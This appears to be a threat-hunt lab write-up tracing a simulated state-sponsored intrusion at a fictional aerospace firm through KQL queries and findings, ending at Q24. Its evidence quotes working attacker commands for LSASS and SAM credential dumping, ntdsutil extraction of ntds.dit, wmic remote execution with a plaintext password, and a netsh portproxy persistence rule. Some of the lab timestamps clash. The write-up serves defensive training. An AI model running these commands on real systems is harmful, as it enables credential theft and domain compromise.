📋  INCIDENT BRIEF
Operation Silent Corridor   Haldric Aerospace
Hunt 04  //  hunt.lognpacific.com  //  Investigation Window: 20 Feb 05 Mar 2026

SITUATION
The Bundesamt für Verfassungsschutz (BfV) issued a confidential advisory to European aerospace and defence organisations. A state-sponsored actor designated GREY VEIL has been conducting targeted intrusions against defence contractors since late 2025, operating on behalf of a foreign intelligence service with primary objectives of intellectual property theft and persistent network access. Previous victim organisations reported extended dwell times before detection. K. Hofmann, CISO of Haldric Aerospace, commissioned a proactive threat hunt across the engineering segment after anomalous VPN authentication patterns were flagged during a routine review.
COMPROMISED SYSTEMS
WS-ENG04 (Engineering Workstation Beachhead), SRV-DC01 (Domain Controller), SRV-FILES02 (File Server)
EVIDENCE AVAILABLE
Microsoft Defender for Endpoint logs (Sysmon telemetry) ingested to SilentCorridorX_CL in Microsoft Sentinel. FortiGate VPN logs. 8 data sources, 8,538 events across the investigation window.
QUERY STARTING POINT
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)

Note: EventTime is the real event timestamp. TimeGenerated is ingestion time only. All filtering and sorting must use EventTime.

Hunt Overview

#
Flag Title
Technique
MITRE ID
Priority
Q01
Compromised VPN Account
Initial Access
T1078
Critical
Q02
Tor Exit Node Source IP
Multi-hop Proxy
T1090.003
Critical
Q03
Distinct Source IP Count
Brute Force
T1110
High
Q04
All Attacker Source IPs
Acquire Infrastructure
T1583
High
Q05
Beachhead Host
Remote Services
T1021
Critical
Q06
First Recon Command
System Info Discovery
T1082
High
Q07
Domain Groups Enumerated
Domain Group Discovery
T1069.002
High
Q08
Internal Target Hosts
Remote System Discovery
T1018
High
Q09
First Credential Activity
Process Discovery
T1057
Critical
Q10
Credential Dump Outcome
LSASS Memory
T1003.001
Critical
Q11
Stored Credential Source
SAM Database
T1003.002
Critical
Q12
Saved Credentials Enum
Credentials from Password Stores
T1555
High
Q13
First Lateral Pivot
SMB/Admin Shares
T1021.002
Critical
Q14
New Account Observed
Valid Accounts
T1078
Critical
Q15
Cross-Host Spawning Tool
WMI Execution
T1047
Critical
Q16
New Filesystem Activity
Data Staged
T1074.001
High
Q17
Critical File Exfiltrated
NTDS
T1003.003
Critical
Q18
Concurrent File Access
Impair Defenses
T1562
Medium
Q19
Database Access Method
NTDS
T1003.003
Critical
Q20
Remote Spawning Process
WMI Execution
T1047
High
Q21
All Hosts via Tunnel
Lateral Movement
T1021
Critical
Q22
Network Config Change
Protocol Tunneling
T1572
Critical
Q23
Registry Storage
Modify Registry
T1112
High
Q24
Matching Config on DC
Protocol Tunneling
T1572
Critical
Q25
Targeted Data Directory
Data from Local System
T1005
Critical
Q26
Packaged Archive Filename
Archive Collected Data
T1560.001
Critical
Q27
Compression Method
Archive Collected Data
T1560.001
High
Q28
Encoding Tool
Obfuscated Files
T1027
High
Q29
Outbound Transfer Command
Exfiltration Over C2
T1041
Critical
Q30
External C2 Destination
Exfiltration to C2
T1041
Critical
Q31
Attacker Reentry Window
External Remote Services
T1133
High
Q32
First Cleanup Action
Clear Windows Event Logs
T1070.001
High
Q33
Log Clearing Method
Clear Windows Event Logs
T1070.001
High
Q34
Surviving Log Source
Impair Defenses
T1562
High
Q35
Exfiltration Confidence
Data Exfiltration
T1041
Critical
Q36
DC Staging Cleanup
File Deletion
T1070.004
High
Q37
High-Level Summary
 
 
 

🚩  Q01: INITIAL ACCESS Compromised VPN Account

🎯 Objective
VPN authentication logs hold the complete story of how the attacker entered the network. The account showing both failed and successful authentication events across unusual external IPs is the entry point for the entire intrusion.
📌 Finding
s.brandt
🔍 Evidence
Field
Value
Account
s.brandt
First Successful Login
2026-02-17T15:20:44Z
Pattern
ssl-login-fail followed by ssl-login-succ
Source
FortiGateVPN

💡 Why it matters
The attacker chose credential brute force over exploitation because it produces less noise and leaves them operating as a legitimate user once it succeeds. Gaining access as s.brandt meant every action they took inside the network would look like normal user behaviour authenticated, trusted, and invisible to controls that rely on detecting known-bad signatures. From the moment this login succeeded, the attacker had a door they could walk back through at any time.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "FortiGateVPN"
| summarize actions=make_set(ActionType) by AccountName, RemoteIP
| sort by AccountName asc

🖼️ Screenshot
[Screenshot here]

🚩  Q02: INITIAL ACCESS Tor Exit Node Source IP

🎯 Objective
Among the IPs used during the brute force, one carries a specific classification that tells us something important about the attacker's level of preparation.
📌 Finding
185.220.101.34
🔍 Evidence
Field
Value
IP
185.220.101.34
Classification
Tor exit node (verified: AbuseIPDB / Talos)
Actions
ssl-login-fail, ssl-login-succ
Account
s.brandt

💡 Why it matters
Routing the brute force through a Tor exit node tells us the attacker understood this operation would generate authentication noise and wanted to ensure none of it traced back to fixed infrastructure. This wasn't an afterthought the anonymisation layer was set up before the first login attempt hit Haldric's gateway. An attacker who uses Tor for an initial access operation is planning from the beginning to avoid being found, and they expect their target to be looking.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| summarize actions=make_set(ActionType) by RemoteIP

🖼️ Screenshot
[Screenshot here]

🚩  Q03: RECONNAISSANCE Distinct Source IP Count

🎯 Objective
Count the number of unique external IP addresses used across all s.brandt VPN sessions to understand the scale of the attacker's infrastructure rotation.
📌 Finding
4
🔍 Evidence
Count
4
IPs
45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34
Account
s.brandt

💡 Why it matters
Four distinct IPs means the attacker arrived with a rotation strategy already in place. A single IP brute force gets blocked at the first detection trigger; cycling through four different ASN types kept the operation alive long enough to succeed. This is not automated credential spraying it reflects someone actively managing their tooling and switching infrastructure when needed, which puts this in a different threat category from opportunistic scanning.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| summarize DistinctIPs=dcount(RemoteIP), AllIPs=make_set(RemoteIP)

🖼️ Screenshot
[Screenshot here]

🚩  Q04: RECONNAISSANCE All Attacker Source IPs

🎯 Objective
Enumerate the complete set of external IPs used by the attacker across the full investigation window for IOC sharing and perimeter blocking.
📌 Finding
45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34
🔍 Evidence
IP
Classification
45.153.160.88
Residential ISP
88.153.72.14
Residential ISP
91.234.33.126
Hosting / data center
185.220.101.34
Tor exit node

💡 Why it matters
Residential ISPs are chosen specifically because they blend in with legitimate user traffic and survive broad IP reputation filtering that would block a data center range immediately. The mix of residential, hosting, and Tor infrastructure confirms this was a paid proxy operation the attacker invested real resources in staying undetected during the access phase. Each of these IPs represents a different layer of the same deliberate anonymisation strategy.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| distinct RemoteIP

🖼️ Screenshot
[Screenshot here]

🚩  Q05: INITIAL ACCESS Beachhead Host

🎯 Objective
VPN-GW01 is only the gateway. After the tunnel was established, the attacker authenticated to an internal host this is where all subsequent operations originated from.
📌 Finding
WS-ENG04
🔍 Evidence
Field
Value
Host
WS-ENG04
Timestamp
2026-02-27T13:45:15Z
LogonType
10 RemoteInteractive (RDP)
RemoteIP
10.1.96.114 (VPN tunnel address)
Account
s.brandt

💡 Why it matters
The attacker went directly to an engineering workstation rather than probing the network from the VPN gateway. WS-ENG04 sitting in the engineering segment means access to technical project files, engineering credentials, and data that has intelligence value. Landing here first is not random it reflects prior knowledge about the internal network layout and where the most valuable access begins. This machine became the origin point for every subsequent action in the intrusion.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceLogonEvents"
| where AccountName == "s.brandt"
| project EventTime, DeviceName, LogonType, RemoteIP
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q06: DISCOVERY First Reconnaissance Command

🎯 Objective
The first clearly attacker-initiated process on the beachhead marks the start of post-exploitation reconnaissance. Sort ascending by EventTime and look for the earliest non-routine command.
📌 Finding
systeminfo.exe/cmd.exe
🔍 Evidence
Timestamp
2026-02-20T02:14:00Z
Process
systeminfo.exe
Parent
cmd.exe
Command
systeminfo
Account
s.brandt

💡 Why it matters
Running systeminfo immediately after landing answers the attacker's first question: what exactly have I compromised? OS version, domain name, hotfix level, and hardware profile feed directly into their decision about what to try next whether the machine is worth exploiting further, whether it's domain-joined, and whether any known vulnerabilities apply. Executing this at 02:14 UTC, when no legitimate engineer is working, removes any ambiguity about who ran it and why.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| project EventTime, FileName, InitiatingProcessFileName, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q07: DISCOVERY Domain Groups Enumerated

🎯 Objective
Process events on WS-ENG04 for net.exe group commands reveal which privileged memberships the attacker was profiling before executing credential theft.
📌 Finding
Domain Admins, Enterprise Admins
🔍 Evidence
Timestamp
2026-02-23T01:47:00Z
Command 1
net group "Domain Admins" /dom
Command 2
net group "Enterprise Admins" /dom
Account
s.brandt

💡 Why it matters
Querying Domain Admins and Enterprise Admins in sequence tells us the attacker was not planning to dump credentials blindly they were building a shortlist of accounts worth the effort of targeted extraction. Knowing which accounts hold full domain control means the attacker could focus their credential theft on the highest-value targets rather than sifting through thousands of hashes. This is methodical preparation, not exploration.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where ProcessCommandLine has_any("net group","net1 group")
| project EventTime, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q08: DISCOVERY Internal Target Hosts

🎯 Objective
DNS queries from WS-ENG04 during the investigation window, filtered to remove routine noise, reveal which internal servers the attacker was actively mapping.
📌 Finding
SRV-DC01, SRV-FILES02
🔍 Evidence
DNS Query
Significance
SRV-DC01
Domain Controller credential target
SRV-FILES02
File Server data collection target

💡 Why it matters
Querying both the domain controller and the file server within the same reconnaissance window tells us the attacker knew exactly what they were looking for before they arrived. A DC and a file server queried in quick succession from an engineering workstation is not curiosity it is a threat actor confirming targets they had already identified through prior intelligence. The precision of this recon is one of the clearest indicators in the entire investigation that this was a planned, targeted operation.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where isnotempty(DnsQueryString)
| where DnsQueryString !has_any("_ldap","_kerberos","wpad","cdn-telemetry","microsoft")
| distinct DnsQueryString

🖼️ Screenshot
[Screenshot here]

🚩  Q09: CREDENTIAL ACCESS First Credential Activity

🎯 Objective
Process events on WS-ENG04 filtered for commands targeting lsass the filter tells you someone is preparing for a memory dump, not performing routine administration.
📌 Finding
tasklist /fi "imagename eq lsass.exe"
🔍 Evidence
Timestamp
2026-02-26T02:38:49Z
Process
tasklist.exe
Parent
cmd.exe
Command
tasklist /fi "imagename eq lsass.exe"
Purpose
Retrieve lsass PID for memory dump targeting

💡 Why it matters
Filtering tasklist specifically for lsass.exe has exactly one purpose: getting the PID needed to target the credential store process for a memory dump. No legitimate user runs this filter. It is a preparation step that only makes sense if a dump attempt is coming next, and it confirms the attacker was operating interactively and methodically. The PID returned here 628 shows up in the comsvcs.dll command that follows 90 seconds later.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where ProcessCommandLine has_any("lsass","procdump","comsvcs","minidump")
| project EventTime, FileName, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q10: CREDENTIAL ACCESS Credential Dump Outcome

🎯 Objective
Determine whether the LSASS memory dump produced an output file and whether any security control intervened. Requires two queries: find the dump command, then check whether the expected file was ever written.
📌 Finding
NO/none
🔍 Evidence
Field
Value
Dump Command
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\Windows\Temp\sys_diag.dmp full
Timestamp
2026-02-26T02:40:03Z
Output File sys_diag.dmp created
No absent from DeviceFileEvents
Security process intervened
No nothing in the window

💡 Why it matters
The dump attempt failed silently and generated no defensive alert. lsass was most likely running as Protected Process Light, which blocks the comsvcs.dll technique without any visible error. What matters here is not that the attacker failed it is that they immediately pivoted to SAM export, cmdkey enumeration, and eventually NTDS extraction via ntdsutil without pausing. An attacker who stops at one failed technique is containable; one who has three backup methods ready is not.
🔧 KQL Query Used
Step 1 find the dump attempt:
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "comsvcs" and ProcessCommandLine has "MiniDump"
| project EventTime, ProcessCommandLine

Step 2 check whether the dump file was written:
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceFileEvents"
| where FileName has_any("sys_diag",".dmp")
| project EventTime, FileName, ActionType

🖼️ Screenshot
[Screenshot here]

🚩  Q11: CREDENTIAL ACCESS Stored Credential Source

🎯 Objective
After the lsass dump failed, the attacker pivoted to registry-based credential extraction. Process events on WS-ENG04 for reg.exe save commands reveal the target hive.
📌 Finding
SAM
🔍 Evidence
Timestamp
2026-02-27T12:20:20Z
Command
reg save HKLM\SAM C:\Windows\Temp\sam.bak
Hive
SAM (Security Account Manager)
Output
sam.bak mimics a routine backup file

💡 Why it matters
Exporting the SAM hive gives the attacker hashed local account credentials that can be cracked offline or used directly in pass-the-hash attacks no further network access required once the file is in hand. The .bak extension is chosen to survive a quick visual scan by anyone looking at the Temp directory; it reads as a routine backup artifact rather than a credential theft output. The SAM alone is not enough the attacker also exports the SYSTEM hive to enable offline decryption but finding this command confirms the credential harvest was underway regardless of what else happened.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where ProcessCommandLine has "reg" and ProcessCommandLine has_any("save","export")
| project EventTime, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q12: CREDENTIAL ACCESS Saved Credentials Enumeration

🎯 Objective
Credential manager utilities on WS-ENG04 reveal whether the attacker checked for credentials saved under the current session.
📌 Finding
cmdkey /list
🔍 Evidence
Timestamp
2026-02-27T11:04:16Z
Command
cmdkey /list
Account
s.brandt

💡 Why it matters
cmdkey /list costs the attacker nothing but can hand them credentials that are immediately usable without any cracking or extraction tooling. Saved RDP passwords, network share credentials, and web credentials stored under the current session all appear in one command. For an attacker already operating under stolen credentials, finding additional saved passwords here means expanding access quietly no new authentication events, no new network traffic, just a list of what's already been saved for them.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where ProcessCommandLine has_any("cmdkey","vaultcmd")
| project EventTime, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q13: LATERAL MOVEMENT First Lateral Pivot

🎯 Objective
Reconstruct the first lateral movement event the tunnel IP the attacker was operating from, the target host, and the stolen credential used. Requires two queries: find the pivot command, then find the tunnel IP from logon events.
📌 Finding
10.1.96.114/SRV-DC01/m.richter
🔍 Evidence
Field
Value
Timestamp
2026-02-28T03:15:00Z
Command
net use \\SRV-DC01\C$ /user:m.richter Haldric2025SecIT
Tunnel IP
10.1.96.114 (VPN-assigned, from DeviceLogonEvents)
Target
SRV-DC01
Credential
m.richter / Haldric2025SecIT (plaintext in telemetry)

💡 Why it matters
This command confirms the credential theft had already succeeded before this pivot ran the attacker walked into the domain controller using working credentials for m.richter rather than forcing their way in. Mounting the DC's C$ admin share over a legitimate net use command is the kind of activity that looks routine in network logs without endpoint process telemetry to give it context. The plaintext password visible in the command line tells us exactly what the attacker harvested, and it must be treated as fully compromised from this point forward.
🔧 KQL Query Used
Step 1 find the pivot command:
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "SRV-DC01"
| project EventTime, ProcessCommandLine
| sort by todatetime(EventTime) asc

Step 2 find the tunnel IP:
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceLogonEvents"
| where AccountName == "s.brandt"
| where DeviceName == "WS-ENG04"
| project EventTime, RemoteIP, LogonType
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q14: LATERAL MOVEMENT New Account Observed

🎯 Objective
Identify the secondary account whose credentials were stolen and confirmed in use during lateral movement.
📌 Finding
m.richter
🔍 Evidence
Account
m.richter
Password (plaintext)
Haldric2025SecIT
Seen in
net use and wmic /node: commands from WS-ENG04
Hosts Active On
WS-ENG04, SRV-DC01, SRV-FILES02

💡 Why it matters
m.richter is not a random account that happened to be on the compromised machine the attacker specifically targeted this account because of where it could go. A file server admin credential gives access to the exact systems on the attacker's target list: the domain controller and the engineering file server. Every subsequent action on SRV-DC01 and SRV-FILES02 runs under this account, making it the operational identity for the collection and exfiltration phase of the intrusion.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "m.richter"
| summarize Hosts=make_set(DeviceName), Commands=count()

🖼️ Screenshot
[Screenshot here]

🚩  Q15: LATERAL MOVEMENT Cross-Host Spawning Tool

🎯 Objective
Process events on WS-ENG04 for commands specifying a remote /node: target identify how the attacker executed commands on SRV-DC01 without opening a separate interactive session.
📌 Finding
wmic
🔍 Evidence
Tool
wmic.exe (Windows built-in)
Timestamp
2026-02-28T03:15:36Z
Command
wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process list brief
Account
s.brandt

💡 Why it matters
wmic was chosen over PSExec or custom tooling because it is a signed Windows binary present on every installation and rarely blocked. Commands sent via wmic /node: arrive at the target host as processes spawned under WmiPrvSE.exe the WMI Provider Host which sidesteps detection rules that look for cmd.exe or powershell.exe as suspicious parent processes on servers. The attacker stayed entirely within what Windows provides natively, leaving no dropped tools and no third-party execution footprint on the domain controller.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "wmic" and ProcessCommandLine has "/node:"
| project EventTime, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q16: COLLECTION New Filesystem Activity on DC

🎯 Objective
DeviceFileEvents on SRV-DC01 filtered for FileCreated actions in Temp paths reveal the staging directory created to hold the NTDS dump output.
📌 Finding
C:\Windows\Temp\McAfee_Logs
🔍 Evidence
Timestamp
2026-02-28T04:18:12Z
Directory
C:\Windows\Temp\McAfee_Logs
Account
m.richter
Parent
WmiPrvSE.exe (remote wmic from WS-ENG04)

💡 Why it matters
McAfee_Logs under C:\Windows\Temp solves two problems for the attacker at once. Temp is writable without elevated permissions and is a path that SOC tools and administrators frequently exclude from scrutiny to reduce alert noise. Naming the directory after a common AV product makes it read as legitimate infrastructure to anyone doing a quick directory listing without looking at the file contents. The attacker was not hiding from forensics tools they were hiding from human reviewers who might catch an obvious staging location during a live incident.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceFileEvents"
| where ActionType == "FileCreated"
| where FolderPath startswith "C:\\Windows\\Temp"
| project EventTime, FileName, FolderPath, InitiatingProcessAccountName
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q17: CREDENTIAL ACCESS Critical File Exfiltrated from DC

🎯 Objective
DeviceFileEvents on SRV-DC01 filtered to the McAfee_Logs directory show exactly what was written to the staging location and which account created it.
📌 Finding
ntds.dit/m.richter
🔍 Evidence
File
Significance
ntds.dit
Active Directory database all domain credential hashes
SYSTEM
Required to decrypt ntds.dit offline
SECURITY
LSA secrets including service account passwords
Account
m.richter
Timestamp
2026-02-28T04:21:13Z

💡 Why it matters
The moment ntds.dit landed outside C:\Windows\NTDS, every credential in the Haldric domain was compromised not just on the machines the attacker had already touched, but across every user, service account, and privileged identity in the organisation. The attacker used ntdsutil's IFM feature to work around the OS file lock on a live domain controller, which requires knowing Active Directory internals well enough to repurpose a legitimate DC management tool as a credential extraction mechanism. This is not scripted commodity tooling it reflects practiced knowledge of the environment.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceFileEvents"
| where FolderPath has "McAfee_Logs"
| project EventTime, FileName, FolderPath, ActionType, InitiatingProcessAccountName
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q18: DEFENSE EVASION Concurrent File Access

🎯 Objective
DeviceFileEvents on SRV-DC01 scoped to the McAfee_Logs time window shows all InitiatingProcessFileName values not just the attacker's revealing whether any security tool accessed the staged files.
📌 Finding
MsMpEng.exe
🔍 Evidence
Process
MsMpEng.exe (Windows Defender)
Timestamp
2026-02-28T04:21:52Z
Files Accessed
ntds.dit, SYSTEM
Outcome
No quarantine, no deletion, no alert

💡 Why it matters
Defender scanned the staged files and did nothing. This tells us the AV policy was not configured to flag ntds.dit written outside its expected directory a gap the attacker may or may not have known about in advance, but one that confirmed their staging was safe to proceed from. The value of this finding is not in the attacker's behaviour; it is in what it reveals about the defensive posture. A missing detection rule on one of the most reliable credential theft indicators is worth addressing regardless of what else is found in this investigation.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceFileEvents"
| where todatetime(EventTime) between (datetime(2026-02-28T04:15:00Z) .. datetime(2026-02-28T04:30:00Z))
| project EventTime, FileName, ActionType, InitiatingProcessFileName
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q19: CREDENTIAL ACCESS Database Access Method

🎯 Objective
Process events on SRV-DC01 filtered for WmiPrvSE.exe as parent reveal the tool used to extract ntds.dit while the Active Directory service was live.
📌 Finding
ntdsutil
🔍 Evidence
Timestamp
2026-02-28T03:16:53Z
Command
ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\McAfee_Logs"
Method
IFM (Install From Media) via Volume Shadow Copy
Parent
WmiPrvSE.exe remote wmic from WS-ENG04

💡 Why it matters
ntdsutil with the IFM flag is a tool Microsoft built for domain controller promotion promoting a new DC from media rather than replicating across the network. The attacker repurposed it as a credential extraction mechanism because it uses VSS to create a snapshot of ntds.dit without touching the live file lock, and because it is a signed Microsoft binary doing something it is genuinely designed to do. AV cannot flag it on signature. Most EDR rules do not cover this use case. Detection has to be behavioural: ntdsutil with IFM arguments on a DC, outside a known maintenance window, initiated by WmiPrvSE.exe.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceProcessEvents"
| where InitiatingProcessFileName has_any("WmiPrvSE","wmiprvse")
| project EventTime, FileName, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q20: LATERAL MOVEMENT Remote Spawning Process and Origin Host

🎯 Objective
Process events on SRV-DC01 filtered for WmiPrvSE.exe as InitiatingProcessFileName reveal every command the attacker ran on the DC and confirm which host sent them.
📌 Finding
WmiPrvSE.exe/WS-ENG04
🔍 Evidence
Parent on SRV-DC01
WmiPrvSE.exe
Commands Spawned
cmd.exe for rmdir, wevtutil cl Security
Origin Host
WS-ENG04 (confirmed via wmic /node: commands in WS-ENG04 process events)

💡 Why it matters
WmiPrvSE.exe spawning cmd.exe on a domain controller is the forensic thread that ties both machines together. Every command that ran on SRV-DC01 the staging directory creation, the ntdsutil dump, the cleanup, the log wipe was sent remotely from WS-ENG04 via wmic. Without this parent-process correlation, the activity on the DC looks disconnected from the beachhead and far harder to attribute. This single relationship confirms WS-ENG04 as the operational centre of the entire attack chain.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceProcessEvents"
| where InitiatingProcessFileName has_any("WmiPrvSE","wmiprvse")
| project EventTime, FileName, InitiatingProcessFileName, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q21: LATERAL MOVEMENT All Hosts Reached via Tunnel

🎯 Objective
DeviceLogonEvents filtered for the attacker's VPN tunnel IP across all devices maps every host they authenticated to from that single entry point.
📌 Finding
SRV-DC01, SRV-FILES02, WS-ENG04
🔍 Evidence
Tunnel IP
10.1.96.114
WS-ENG04
Beachhead all operations commanded from here
SRV-DC01
Domain Controller NTDS extracted
SRV-FILES02
File Server A400M data exfiltrated

💡 Why it matters
Three hosts from one tunnel IP defines the containment boundary precisely. The attacker did not need to spread broadly they had identified exactly where the value was before they arrived and hit only those three targets. For incident response, this finding removes ambiguity: WS-ENG04, SRV-DC01, and SRV-FILES02 must all be isolated and examined. Every other machine in the environment can be deprioritised until forensics on these three are complete.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where MdeTable == "DeviceLogonEvents"
| where RemoteIP == "10.1.96.114"
| summarize Hosts=make_set(DeviceName)

🖼️ Screenshot
[Screenshot here]

🚩  Q22: PERSISTENCE Network Configuration Change

🎯 Objective
Process events on WS-ENG04 for netsh portproxy commands reveal the persistent tunnel installed to maintain access independent of the VPN session.
📌 Finding
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local
🔍 Evidence
Timestamp
2026-02-28T03:25:27Z
Command
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local
Effect
Port 8443 on WS-ENG04 forwards to SRV-DC01:445 (SMB)
Why 8443
HTTPS alternate port passes through most firewalls

💡 Why it matters
This portproxy rule was not installed for the current session it was installed for every session after it. By forwarding port 8443 on the beachhead directly to the domain controller's SMB service, the attacker created a path into SRV-DC01 that would survive the VPN credentials being reset, a firewall rule blocking the original entry point, or even the decommissioning of s.brandt's account entirely. As long as WS-ENG04 is reachable on port 8443, the domain controller's file system is one connection away. This is the command that makes "we reset the passwords" an insufficient remediation response.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where ProcessCommandLine has "portproxy"
| project EventTime, ProcessCommandLine
| sort by todatetime(EventTime) asc

🖼️ Screenshot
[Screenshot here]

🚩  Q23: PERSISTENCE Registry Storage of Config

🎯 Objective
DeviceRegistryEvents on WS-ENG04 scoped to the portproxy command timestamp confirms where the rule is stored and whether it will survive a reboot.
📌 Finding
HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp
🔍 Evidence
Registry Key
HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp
Value
0.0.0.0/8443
Action
RegistryValueSet
Persistence
Loaded at boot no process required to keep it alive

💡 Why it matters
Writing to HKLM under the Services hive means Windows loads the portproxy rule at boot with no running process, no scheduled task, and no user session required. The attacker does not need to maintain a persistent beacon on WS-ENG04 to keep this tunnel open the operating system maintains it for them automatically. This key is what incident responders must find and delete. Every other remediation step password resets, VPN revocation, firewall changes leaves the tunnel intact if this registry value is not removed.
🔧 KQL Query Used
SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceRegistryEvents"
| where todatetime(EventTime) between (datetime(2026-02-28T03:20:00Z) .. datetime(2026-02-28T03:35:00Z))
| project EventTime, RegistryKey, RegistryValueName, ActionType

🖼️ Screenshot
[Screenshot here]

🚩  Q24: PERSISTENCE Matching Config on DC

🎯 Objective
